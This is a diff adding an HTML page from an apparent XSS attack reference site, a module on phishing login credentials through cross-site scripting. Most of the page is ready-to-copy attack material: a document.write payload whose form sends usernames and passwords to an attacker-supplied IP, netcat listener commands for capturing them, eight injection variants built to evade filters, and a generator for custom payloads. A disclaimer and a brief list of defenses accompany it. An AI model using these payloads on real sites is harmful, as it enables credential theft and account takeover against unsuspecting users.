@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS-db | XSS Phishing</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e0a;
+    --bg2: #0d120d;
+    --bg3: #111811;
+    --surface: #141c14;
+    --surface2: #1a241a;
+    --border: #1f2f1f;
+    --border2: #2a3f2a;
+    --green: #00ff41;
+    --green2: #00cc33;
+    --green3: #008f23;
+    --green4: #004f13;
+    --green-dim: #00ff4133;
+    --green-glow: #00ff4166;
+    --text: #c8ffc8;
+    --text-dim: #6a9a6a;
+    --text-muted: #3a5a3a;
+    --red: #ff4141;
+    --yellow: #ffe041;
+    --cyan: #41ffee;
+    --orange: #ff9944;
+    --purple: #cc88ff;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Fira Code', monospace;
+    font-size: 13px;
+    line-height: 1.6;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+  body::before {
+    content: '';
+    position: fixed; top:0; left:0; right:0; bottom:0;
+    background: repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,0.015) 2px,rgba(0,255,65,0.015) 4px);
+    pointer-events: none; z-index: 9999;
+  }
+
+  nav {
+    position: sticky; top: 0; z-index: 100;
+    background: rgba(10,14,10,0.95);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--border2);
+    padding: 0 24px;
+    display: flex; align-items: center; gap: 32px; height: 52px;
+  }
+  .nav-logo { font-family:'Rajdhani',sans-serif; font-weight:700; font-size:20px; color:var(--green); text-shadow:0 0 20px var(--green-glow); letter-spacing:2px; text-decoration:none; flex-shrink:0; }
+  .nav-logo span { color:var(--text-dim); font-weight:400; }
+  .nav-links { display:flex; gap:4px; flex:1; }
+  .nav-links a { color:var(--text-dim); text-decoration:none; padding:6px 14px; border-radius:4px; font-size:12px; letter-spacing:1px; transition:all 0.2s; border:1px solid transparent; font-family:'Share Tech Mono',monospace; }
+  .nav-links a:hover, .nav-links a.active { color:var(--green); border-color:var(--border2); background:var(--surface); text-shadow:0 0 10px var(--green-glow); }
+  .nav-badge { font-size:10px; background:var(--green4); color:var(--green); border:1px solid var(--green3); padding:2px 8px; border-radius:2px; margin-left:auto; font-family:'Share Tech Mono',monospace; letter-spacing:1px; }
+
+  .hero {
+    padding: 60px 24px 40px;
+    border-bottom: 1px solid var(--border);
+    position: relative; overflow: hidden;
+  }
+  .hero::after {
+    content:''; position:absolute; top:-50%; right:-10%; width:600px; height:600px;
+    background:radial-gradient(circle,rgba(204,136,255,0.05) 0%,transparent 70%);
+    pointer-events:none;
+  }
+  .hero-label { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--green3); letter-spacing:3px; margin-bottom:16px; }
+  .hero h1 { font-family:'Rajdhani',sans-serif; font-size:clamp(28px,4vw,48px); font-weight:700; color:var(--green); text-shadow:0 0 40px var(--green-glow); line-height:1.1; margin-bottom:16px; letter-spacing:2px; }
+  .hero h1 .accent { color: var(--purple); text-shadow:0 0 30px rgba(200,100,255,0.5); }
+  .hero p { color:var(--text-dim); max-width:640px; font-size:13px; line-height:1.7; }
+  .warning-box {
+    margin-top: 24px;
+    background: rgba(255,65,65,0.06);
+    border: 1px solid rgba(255,65,65,0.3);
+    border-radius: 6px;
+    padding: 14px 18px;
+    display: flex; gap: 12px; align-items: flex-start;
+    max-width: 640px;
+  }
+  .warn-icon { color: var(--red); flex-shrink: 0; font-size: 16px; }
+  .warn-text { font-size: 12px; color: #cc8888; line-height: 1.6; }
+  .warn-text strong { color: var(--red); }
+
+  .content { padding: 32px 24px; max-width: 900px; }
+
+  .step-section { margin-bottom: 48px; }
+  .step-header { display:flex; align-items:center; gap:16px; margin-bottom:20px; }
+  .step-num { font-family:'Rajdhani',sans-serif; font-size:12px; font-weight:700; letter-spacing:3px; color:var(--green3); background:var(--green4); border:1px solid var(--green3); padding:4px 12px; border-radius:3px; flex-shrink:0; }
+  .step-title { font-family:'Rajdhani',sans-serif; font-size:22px; font-weight:700; color:var(--green); letter-spacing:1px; }
+  .step-desc { color:var(--text-dim); font-size:12px; line-height:1.7; margin-bottom:16px; max-width:700px; }
+
+  .code-block { background:var(--bg3); border:1px solid var(--border2); border-radius:6px; overflow:hidden; margin-bottom:16px; }
+  .code-header { display:flex; align-items:center; justify-content:space-between; padding:8px 14px; background:var(--surface); border-bottom:1px solid var(--border); }
+  .code-lang { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--text-muted); letter-spacing:2px; }
+  .code-filename { font-family:'Fira Code',monospace; font-size:11px; color:var(--green3); }
+  .copy-btn { background:none; border:1px solid var(--border2); color:var(--text-muted); padding:3px 10px; cursor:pointer; font-size:10px; font-family:'Share Tech Mono',monospace; border-radius:2px; transition:all 0.2s; }
+  .copy-btn:hover { color:var(--green); border-color:var(--green3); }
+  .copy-btn.copied { color:var(--green); border-color:var(--green3); }
+  pre { padding:20px; overflow-x:auto; font-family:'Fira Code',monospace; font-size:12px; line-height:1.7; }
+
+  .kw { color: #ff9944; }
+  .str { color: #ffe041; }
+  .fn { color: #41ffee; }
+  .cmt { color: var(--text-muted); font-style:italic; }
+  .var { color: #00ff41; }
+  .tag { color: #ff6688; }
+  .sh-prompt { color: var(--green3); }
+  .sh-cmd { color: #ffe041; }
+  .hl { color: var(--green); }
+  .attr { color: var(--orange); }
+  .val { color: var(--purple); }
+
+  .info-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:12px; margin-bottom:20px; }
+  .info-card { background:var(--surface); border:1px solid var(--border2); border-radius:6px; padding:16px; }
+  .info-card-label { font-size:10px; color:var(--text-muted); letter-spacing:2px; margin-bottom:6px; }
+  .info-card-value { font-size:13px; color:var(--text); font-family:'Fira Code',monospace; }
+  .info-card-value .highlight { color:var(--green); }
+
+  .flow-diagram { background:var(--surface); border:1px solid var(--border2); border-radius:6px; padding:24px; margin-bottom:24px; font-family:'Share Tech Mono',monospace; font-size:11px; overflow-x:auto; }
+  .flow-row { display:flex; align-items:center; gap:12px; margin-bottom:8px; flex-wrap:wrap; }
+  .flow-box { background:var(--bg3); border:1px solid var(--border2); padding:6px 14px; border-radius:3px; color:var(--text-dim); white-space:nowrap; }
+  .flow-box.green { border-color:var(--green3); color:var(--green); }
+  .flow-box.red { border-color:rgba(255,65,65,0.4); color:#ff8888; }
+  .flow-box.yellow { border-color:rgba(255,224,65,0.4); color:var(--yellow); }
+  .flow-box.purple { border-color:rgba(200,136,255,0.4); color:var(--purple); }
+  .flow-arrow { color:var(--text-muted); }
+
+  .preview-section {
+    background: var(--surface);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    overflow: hidden;
+    margin-bottom: 20px;
+  }
+  .preview-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 16px;
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+  }
+  .preview-label { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--text-muted); letter-spacing:2px; }
+  .preview-body { padding: 24px; }
+  .fake-login {
+    background: #1a1a2e;
+    border: 1px solid #333;
+    border-radius: 8px;
+    padding: 24px;
+    max-width: 340px;
+    font-family: Arial, sans-serif;
+  }
+  .fake-login h3 { color: #fff; font-size: 18px; margin-bottom: 20px; }
+  .fake-login input {
+    width: 100%;
+    background: #252535;
+    border: 1px solid #444;
+    color: #fff;
+    padding: 10px 14px;
+    border-radius: 4px;
+    font-size: 14px;
+    margin-bottom: 12px;
+    font-family: Arial, sans-serif;
+    box-sizing: border-box;
+  }
+  .fake-login button {
+    width: 100%;
+    background: #4a5cff;
+    border: none;
+    color: #fff;
+    padding: 10px;
+    border-radius: 4px;
+    font-size: 14px;
+    cursor: pointer;
+    font-family: Arial, sans-serif;
+  }
+  .preview-caption { font-size: 11px; color: var(--text-muted); padding: 10px 16px; border-top: 1px solid var(--border); font-style: italic; }
+
+  .payload-variants { display:grid; gap:8px; }
+  .variant-item { background:var(--surface); border:1px solid var(--border); border-radius:4px; overflow:hidden; }
+  .variant-header { display:flex; align-items:center; padding:8px 12px; gap:10px; cursor:pointer; }
+  .variant-idx { font-size:10px; color:var(--text-muted); width:24px; flex-shrink:0; }
+  .variant-code { font-family:'Fira Code',monospace; font-size:12px; color:var(--green2); flex:1; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+  .variant-tag { font-size:9px; padding:2px 8px; background:rgba(204,136,255,0.1); border:1px solid rgba(204,136,255,0.3); color:var(--purple); border-radius:2px; font-family:'Share Tech Mono',monospace; }
+  .variant-copy { background:none; border:1px solid var(--border2); color:var(--text-muted); padding:3px 10px; cursor:pointer; font-size:10px; font-family:'Share Tech Mono',monospace; border-radius:2px; transition:all 0.2s; flex-shrink:0; }
+  .variant-copy:hover { color:var(--green); border-color:var(--green3); }
+  .variant-detail { display:none; padding:12px 16px; border-top:1px solid var(--border); background:var(--bg); }
+  .variant-detail.open { display:block; }
+  .variant-full { background:var(--bg3); border:1px solid var(--border2); border-radius:4px; padding:10px; font-family:'Fira Code',monospace; font-size:12px; color:var(--green); word-break:break-all; margin-bottom:8px; }
+  .variant-desc { color:var(--text-dim); font-size:12px; line-height:1.6; }
+
+  .divider { height:1px; background:var(--border); margin:48px 0; }
+
+  .customizer {
+    background: var(--surface);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    padding: 20px;
+    margin-bottom: 20px;
+  }
+  .cust-label { font-size:10px; color:var(--text-muted); letter-spacing:2px; margin-bottom:6px; }
+  .cust-input { width:100%; background:var(--bg3); border:1px solid var(--border2); color:var(--text); font-family:'Fira Code',monospace; font-size:12px; padding:8px 12px; border-radius:4px; outline:none; transition:border-color 0.2s; margin-bottom:12px; }
+  .cust-input:focus { border-color:var(--green3); box-shadow:0 0 0 2px var(--green-dim); }
+  .cust-output { background:var(--bg); border:1px solid var(--border2); border-radius:4px; padding:14px; font-family:'Fira Code',monospace; font-size:12px; color:var(--green); min-height:60px; word-break:break-all; line-height:1.5; margin-bottom:8px; }
+  .btn { background:transparent; border:1px solid var(--green3); color:var(--green); padding:8px 16px; font-family:'Share Tech Mono',monospace; font-size:11px; letter-spacing:1px; cursor:pointer; border-radius:4px; transition:all 0.2s; margin-right:8px; }
+  .btn:hover { background:var(--green4); box-shadow:0 0 10px var(--green-glow); }
+  .btn-primary { background:var(--green4); border-color:var(--green2); }
+
+  footer { border-top:1px solid var(--border); padding:24px; text-align:center; color:var(--text-muted); font-size:11px; letter-spacing:1px; }
+  footer a { color:var(--green3); text-decoration:none; }
+
+  .toast { position:fixed; bottom:24px; right:24px; background:var(--surface2); border:1px solid var(--green3); color:var(--green); padding:10px 20px; border-radius:4px; font-family:'Share Tech Mono',monospace; font-size:12px; letter-spacing:1px; opacity:0; transform:translateY(10px); transition:all 0.3s; z-index:9998; text-shadow:0 0 10px var(--green-glow); box-shadow:0 0 20px var(--green-dim); }
+  .toast.show { opacity:1; transform:translateY(0); }
+
+  @media(max-width:768px) { nav { gap:16px; } .nav-links a { padding:6px 10px; font-size:11px; } }
+</style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="index.html">XSS<span>-db</span></a>
+  <div class="nav-links">
+    <a href="index.html">WORDLIST</a>
+    <a href="hijacking.html">XSS HIJACKING</a>
+    <a href="phishing.html" class="active">XSS PHISHING</a>
+  </div>
+  <div class="nav-badge">v1.0.0</div>
+</nav>
+
+<div class="hero">
+  <div class="hero-label">&gt; MODULE / XSS PHISHING</div>
+  <h1>Login Form <span class="accent">Phishing</span> via XSS</h1>
+  <p>XSS phishing combines a Cross-Site Scripting vulnerability with social engineering. Instead of just stealing cookies, the attacker injects a fake login form directly into the victim's browser — on the real website's domain. Because the URL and domain appear legitimate, victims are far more likely to submit their credentials.</p>
+  <div class="warning-box">
+    <div class="warn-icon">⚠</div>
+    <div class="warn-text"><strong>AUTHORIZED TESTING ONLY.</strong> Deploying phishing forms against real users without explicit written authorization is illegal. This is intended for CTF competitions, security awareness training, and authorized penetration testing scenarios only.</div>
+  </div>
+</div>
+
+<div class="content">
+
+  <!-- OVERVIEW -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">OVERVIEW</div>
+      <div class="step-title">How XSS Phishing Differs</div>
+    </div>
+    <div class="step-desc">
+      Unlike traditional phishing that requires a fake domain (which can be detected), XSS phishing hosts the fake form on the <strong style="color:var(--text)">real target website's domain</strong>. The victim sees the correct URL in their browser — making detection extremely difficult without inspecting the page source.
+    </div>
+
+    <div class="flow-diagram">
+      <div class="flow-row">
+        <div class="flow-box">Attacker finds XSS vulnerability</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box yellow">Injects document.write payload</div>
+      </div>
+      <div class="flow-row">
+        <div class="flow-box yellow">Victim visits legitimate URL</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box purple">Fake login form overlays page</div>
+      </div>
+      <div class="flow-row">
+        <div class="flow-box purple">Victim submits credentials</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box red">nc listener captures creds</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box green">ACCOUNT COMPROMISED</div>
+      </div>
+    </div>
+
+    <div class="info-grid">
+      <div class="info-card">
+        <div class="info-card-label">ATTACK TYPE</div>
+        <div class="info-card-value"><span class="highlight">Stored / Reflected XSS</span> + Social Engineering</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">LISTENER</div>
+        <div class="info-card-value">netcat <span class="highlight">nc -lvnp 80</span></div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">STEALTH LEVEL</div>
+        <div class="info-card-value"><span class="highlight">HIGH</span> — real domain shown in URL bar</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">DELIVERY</div>
+        <div class="info-card-value"><span class="highlight">document.write()</span> DOM injection</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- FAKE LOGIN PREVIEW -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">PREVIEW</div>
+      <div class="step-title">What the Victim Sees</div>
+    </div>
+    <div class="step-desc">
+      The injected payload writes a convincing login form over the existing page content. The existing URL bar still shows the legitimate domain. The form's action attribute points to the attacker's listener.
+    </div>
+
+    <div class="preview-section">
+      <div class="preview-header">
+        <div class="preview-label">INJECTED FORM — VICTIM'S VIEW</div>
+        <div style="font-size:11px; color:var(--green3); font-family:'Share Tech Mono',monospace;">DOM INJECTION</div>
+      </div>
+      <div class="preview-body">
+        <div class="fake-login">
+          <h3>Please login to continue</h3>
+          <input type="text" placeholder="Username" disabled>
+          <input type="password" placeholder="Password" disabled>
+          <button disabled>Login</button>
+        </div>
+      </div>
+      <div class="preview-caption">↑ This form is injected via document.write() — the page URL still shows the legitimate target domain. Disabled here for safety.</div>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- STEP 1: THE PAYLOAD -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">STEP 01</div>
+      <div class="step-title">The Phishing Payload</div>
+    </div>
+    <div class="step-desc">
+      This payload uses document.write() to inject a fake login form into the page. It also removes the existing form (if any) using document.getElementById('urlform').remove() to clean up the page and make the fake form the only visible element. The form's action sends credentials to your IP via a GET request.
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">JAVASCRIPT</span>
+        <span class="code-filename">phishing payload</span>
+        <button class="copy-btn" onclick="copyCode(this,'phish-payload')">COPY</button>
+      </div>
+      <pre id="phish-payload"><span class="var">document</span>.<span class="fn">write</span>(<span class="str">'&lt;h3&gt;Please login to continue&lt;/h3&gt;'</span>
+  + <span class="str">'&lt;form action=http://YOUR_IP&gt;'</span>
+  + <span class="str">'&lt;input type="username" name="username" placeholder="Username"&gt;'</span>
+  + <span class="str">'&lt;input type="password" name="password" placeholder="Password"&gt;'</span>
+  + <span class="str">'&lt;input type="submit" name="submit" value="Login"&gt;'</span>
+  + <span class="str">'&lt;/form&gt;'</span>);
+<span class="var">document</span>.<span class="fn">getElementById</span>(<span class="str">'urlform'</span>).<span class="fn">remove</span>();</pre>
+    </div>
+
+    <div class="step-desc">
+      <strong style="color:var(--text)">One-line injection version</strong> (for direct input field injection):
+    </div>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">JAVASCRIPT (one-line)</span>
+        <span class="code-filename">for direct injection</span>
+        <button class="copy-btn" onclick="copyCode(this,'phish-oneline')">COPY</button>
+      </div>
+      <pre id="phish-oneline"><span class="var">document</span>.<span class="fn">write</span>(<span class="str">'&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://YOUR_IP&gt;&lt;input type="username" name="username" placeholder="Username"&gt;&lt;input type="password" name="password" placeholder="Password"&gt;&lt;input type="submit" name="submit" value="Login"&gt;&lt;/form&gt;'</span>);<span class="var">document</span>.<span class="fn">getElementById</span>(<span class="str">'urlform'</span>).<span class="fn">remove</span>();</pre>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- STEP 2: LISTENER -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">STEP 02</div>
+      <div class="step-title">Start the Netcat Listener</div>
+    </div>
+    <div class="step-desc">
+      Set up a netcat listener on port 80. When the victim submits the form, their browser sends a GET request to your IP with the username and password in the URL query string. Netcat captures the full HTTP request — including the credentials.
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">SHELL</span>
+        <span class="code-filename">terminal</span>
+        <button class="copy-btn" onclick="copyCode(this,'nc-listener')">COPY</button>
+      </div>
+      <pre id="nc-listener"><span class="sh-prompt">$</span> <span class="sh-cmd">sudo nc -lvnp 80</span>
+<span class="cmt">Listening on [0.0.0.0] (family 0, port 80)
+Connection from 192.168.1.50 54322 received!
+GET /?username=admin&password=supersecret123&submit=Login HTTP/1.1
+Host: 10.200.1.255
+User-Agent: Mozilla/5.0 ...
+...</span></pre>
+    </div>
+
+    <div class="step-desc">
+      The credentials appear as GET parameters in the request line. No server setup required — netcat receives the raw HTTP request and you can read the query string directly.
+    </div>
+
+    <div class="step-desc" style="margin-top:12px">
+      <strong style="color:var(--yellow)">Alternative: Log to file</strong> using tee to keep a persistent record:
+    </div>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">SHELL</span>
+        <span class="code-filename">log to file</span>
+        <button class="copy-btn" onclick="copyCode(this,'nc-log')">COPY</button>
+      </div>
+      <pre id="nc-log"><span class="sh-prompt">$</span> <span class="sh-cmd">sudo nc -lvnp 80 | tee captured_creds.txt</span></pre>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- STEP 3: INJECT -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">STEP 03</div>
+      <div class="step-title">Injection Payloads — Ready to Use</div>
+    </div>
+    <div class="step-desc">
+      The following payloads inject the phishing form in various XSS contexts. Replace <strong style="color:var(--green)">YOUR_IP</strong> with your listener's IP address. Click any payload to expand it and see how it works.
+    </div>
+
+    <div class="payload-variants" id="phish-payload-list"></div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- STEP 4: CUSTOMIZER -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">GENERATOR</div>
+      <div class="step-title">Custom Phishing Form Builder</div>
+    </div>
+    <div class="step-desc">
+      Generate a customized phishing payload with your own parameters. The generated payload uses document.write() to inject the form.
+    </div>
+
+    <div class="customizer">
+      <div class="cust-label">YOUR LISTENER IP / DOMAIN</div>
+      <input class="cust-input" id="cust-ip" type="text" placeholder="10.200.1.255" value="10.200.1.255">
+
+      <div class="cust-label">FAKE FORM TITLE</div>
+      <input class="cust-input" id="cust-title" type="text" placeholder="Please login to continue" value="Please login to continue">
+
+      <div class="cust-label">USERNAME FIELD LABEL</div>
+      <input class="cust-input" id="cust-uname" type="text" placeholder="Username" value="Username">
+
+      <div class="cust-label">PASSWORD FIELD LABEL</div>
+      <input class="cust-input" id="cust-pass" type="text" placeholder="Password" value="Password">
+
+      <div class="cust-label">SUBMIT BUTTON TEXT</div>
+      <input class="cust-input" id="cust-submit" type="text" placeholder="Login" value="Login">
+
+      <div class="cust-label">ELEMENT ID TO REMOVE (optional)</div>
+      <input class="cust-input" id="cust-remove" type="text" placeholder="urlform (or leave blank)" value="urlform">
+
+      <button class="btn btn-primary" onclick="buildCustom()">BUILD PAYLOAD</button>
+      <button class="btn" onclick="copyCustom()">COPY OUTPUT</button>
+
+      <div style="margin-top:14px">
+        <div class="cust-label">GENERATED PAYLOAD</div>
+        <div class="cust-output" id="cust-output">// Fill in the fields above and click BUILD PAYLOAD</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- DEFENSE -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">DEFENSE</div>
+      <div class="step-title">Mitigations & Defenses</div>
+    </div>
+    <div class="info-grid">
+      <div class="info-card">
+        <div class="info-card-label">PREVENT XSS FIRST</div>
+        <div class="info-card-value">XSS phishing depends entirely on a working XSS vulnerability. Fix the XSS and this attack is impossible.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">CSP HEADER</div>
+        <div class="info-card-value"><span class="highlight">Content-Security-Policy</span> with form-action 'self' blocks the form from submitting to external domains.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">PASSWORD MANAGERS</div>
+        <div class="info-card-value">Password managers check the <span class="highlight">actual domain</span> — they won't autofill on injected forms pointing to wrong action URLs.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">SECURITY AWARENESS</div>
+        <div class="info-card-value">Teach users to <span class="highlight">never enter credentials</span> into unexpected login prompts, even on known sites.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">SUBRESOURCE INTEGRITY</div>
+        <div class="info-card-value">Use SRI hashes on scripts + <span class="highlight">strict CSP</span> to prevent dynamic DOM modifications from injected code.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">INPUT VALIDATION</div>
+        <div class="info-card-value"><span class="highlight">Encode all output</span>. Use context-aware escaping — HTML entity encoding for HTML context, JS escaping for script context.</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <div style="color:var(--green3); font-family:'Rajdhani',sans-serif; font-size:16px; font-weight:700; margin-bottom:8px; letter-spacing:3px;">XSS-db</div>
+  FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY &nbsp;|&nbsp;
+  <a href="index.html">← BACK TO WORDLIST</a>
+</footer>
+
+<div class="toast" id="toast">COPIED TO CLIPBOARD</div>
+
+<script>
+const PHISH_PAYLOADS = [
+  {
+    code: `document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();`,
+    tag: 'BASIC',
+    desc: "Core phishing payload. Writes the fake login form to the page using document.write(), then removes the existing #urlform element to prevent users from seeing the real form underneath."
+  },
+  {
+    code: `<script>document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input name="user" placeholder="Username"><input type="password" name="pass" placeholder="Password"><input type="submit" value="Login"></form>')<\/script>`,
+    tag: 'SCRIPT TAG',
+    desc: "Wrapped in a script tag for direct HTML injection. Works in stored XSS where the payload is reflected in an HTML context. The form submits credentials to YOUR_IP."
+  },
+  {
+    code: `"><script>document.body.innerHTML='<h3>Session expired. Please re-authenticate.</h3><form action=http://YOUR_IP method=get><input name=u placeholder=Username><input type=password name=p placeholder=Password><button>Continue</button></form>'<\/script>`,
+    tag: 'ATTR BREAK',
+    desc: "Breaks out of double-quoted attribute, replaces the entire body innerHTML with a 'session expired' social engineering message. More convincing than a direct 'login to continue' prompt."
+  },
+  {
+    code: `<img src=x onerror="document.body.innerHTML='<center><h2>Your session has expired</h2><form action=http://YOUR_IP><input name=email placeholder=Email><input type=password name=pwd placeholder=Password><button>Re-Login</button></form></center>'">`,
+    tag: 'IMG ONERROR',
+    desc: "Img onerror vector. Injects when the broken image loads. Replaces the body with a centered re-login form. Uses onerror to bypass filters that block script tags."
+  },
+  {
+    code: `<svg onload="var f=document.createElement('form');f.action='http://YOUR_IP';f.innerHTML='<h3>Login Required</h3><input name=u placeholder=Username><input type=password name=p placeholder=Password><button>Submit</button>';document.body.prepend(f)">`,
+    tag: 'SVG + DOM API',
+    desc: "SVG onload uses DOM API instead of innerHTML/document.write. Creates form element programmatically and prepends it to the body. More evasive against innerHTML-blocking filters."
+  },
+  {
+    code: `javascript:document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input name=u placeholder=Username><input type=password name=p placeholder=Password><button>Login</button></form>')`,
+    tag: 'JAVASCRIPT URI',
+    desc: "JavaScript: URI variant for href/action attribute injection. When the user clicks a link or submits a form pointing to this URI, it executes the phishing write."
+  },
+  {
+    code: `<script>setTimeout(function(){document.body.style.display='none';var d=document.createElement('div');d.style='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;display:flex;align-items:center;justify-content:center';d.innerHTML='<form action=http://YOUR_IP style="text-align:center"><h2>Session Expired</h2><br><input name=u placeholder=Username style="display:block;margin:8px auto;padding:8px;width:200px"><input type=password name=p placeholder=Password style="display:block;margin:8px auto;padding:8px;width:200px"><button style="padding:8px 24px">Login</button></form>';document.body.appendChild(d)},500)<\/script>`,
+    tag: 'FULLSCREEN',
+    desc: "Advanced payload: hides the entire page body, then creates a full-screen overlay after 500ms delay. The overlay covers the whole viewport with a centered login form. Much more convincing than a partial injection."
+  },
+  {
+    code: `<script>if(!sessionStorage.phish){sessionStorage.phish=1;document.write('<h3>Please verify your identity</h3><form action=http://YOUR_IP><input name=u placeholder=Email><input type=password name=p placeholder=Password><button>Verify</button></form>')}<\/script>`,
+    tag: 'ONCE-ONLY',
+    desc: "Uses sessionStorage to only show the phishing form once per browser session. Prevents repeated display on page refresh — appears more like a legitimate one-time authentication prompt."
+  }
+];
+
+function renderPhishPayloads() {
+  const c = document.getElementById('phish-payload-list');
+PHISH_PAYLOADS.forEach(function(p, i) {
+    const item = document.createElement('div');
+    item.className = 'variant-item';
+
+    const header = document.createElement('div');
+    header.className = 'variant-header';
+    header.onclick = function(){ this.nextElementSibling.classList.toggle('open'); };
+
+    const idxEl = document.createElement('div');
+    idxEl.className = 'variant-idx';
+    idxEl.textContent = i + 1;
+
+    const codeEl = document.createElement('div');
+    codeEl.className = 'variant-code';
+    codeEl.textContent = p.code;
+
+    const tagEl = document.createElement('div');
+    tagEl.className = 'variant-tag';
+    tagEl.textContent = p.tag;
+
+    const copyBtn = document.createElement('button');
+    copyBtn.className = 'variant-copy';
+    copyBtn.textContent = 'COPY';
+    copyBtn.onclick = function(e){ e.stopPropagation(); cp(this, encodeURIComponent(p.code)); };
+
+    header.appendChild(idxEl);
+    header.appendChild(codeEl);
+    header.appendChild(tagEl);
+    header.appendChild(copyBtn);
+
+    const detail = document.createElement('div');
+    detail.className = 'variant-detail';
+
+    const fullEl = document.createElement('div');
+    fullEl.className = 'variant-full';
+    fullEl.textContent = p.code;
+
+    const descEl = document.createElement('div');
+    descEl.className = 'variant-desc';
+    descEl.textContent = p.desc;
+
+    detail.appendChild(fullEl);
+    detail.appendChild(descEl);
+    item.appendChild(header);
+    item.appendChild(detail);
+    document.getElementById('injection-payloads').appendChild(item);
+  });
+}
+function esc(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/`/g,'&#96;').replace(/\$/g,'&#36;');
+}
+
+function cp(btn, encoded) {
+  navigator.clipboard.writeText(decodeURIComponent(encoded)).then(() => {
+    btn.textContent = 'COPIED!';
+    setTimeout(() => btn.textContent = 'COPY', 1500);
+    showToast();
+  });
+}
+
+function copyCode(btn, id) {
+  const el = document.getElementById(id);
+  navigator.clipboard.writeText(el.innerText || el.textContent).then(() => {
+    btn.textContent = 'COPIED!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500);
+    showToast();
+  });
+}
+
+function buildCustom() {
+  const ip = document.getElementById('cust-ip').value || 'YOUR_IP';
+  const title = document.getElementById('cust-title').value || 'Please login to continue';
+  const uname = document.getElementById('cust-uname').value || 'Username';
+  const pass = document.getElementById('cust-pass').value || 'Password';
+  const submit = document.getElementById('cust-submit').value || 'Login';
+  const remove = document.getElementById('cust-remove').value.trim();
+
+  let payload = `document.write('`;
+  payload += `<h3>${title}</h3>`;
+  payload += `<form action=http://${ip}>`;
+  payload += `<input type="text" name="username" placeholder="${uname}">`;
+  payload += `<input type="password" name="password" placeholder="${pass}">`;
+  payload += `<input type="submit" name="submit" value="${submit}">`;
+  payload += `</form>');`;
+  if (remove) {
+    payload += `document.getElementById('${remove}').remove();`;
+  }
+
+  document.getElementById('cust-output').textContent = payload;
+}
+
+function copyCustom() {
+  const text = document.getElementById('cust-output').textContent;
+  if (text.startsWith('//')) return;
+  navigator.clipboard.writeText(text).then(() => showToast());
+}
+
+function showToast() {
+  const t = document.getElementById('toast');
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2000);
+}
+
+renderPhishPayloads();
+buildCustom();
+</script>
+</body>
+</html>
